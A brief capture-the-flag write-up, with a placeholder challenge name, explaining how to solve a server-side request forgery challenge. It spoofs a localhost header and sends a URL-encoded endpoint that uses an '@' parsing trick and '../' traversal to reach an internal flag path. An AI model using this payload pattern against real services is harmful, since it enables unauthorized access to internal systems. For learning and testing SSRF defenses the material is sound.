# Challenge name

## Write-up

Add this header: `X-Forwarded-With: 127.0.0.1`  
and then visit this URL to trigger the SSRF `/request?endpoint=http%400%2f127.0.0.1%3a8000%2finternal%2f..%2f..%2fflag`   

which is equivalent to this endpoint `http@0/127.0.0.1:8000/internal/../../flag`


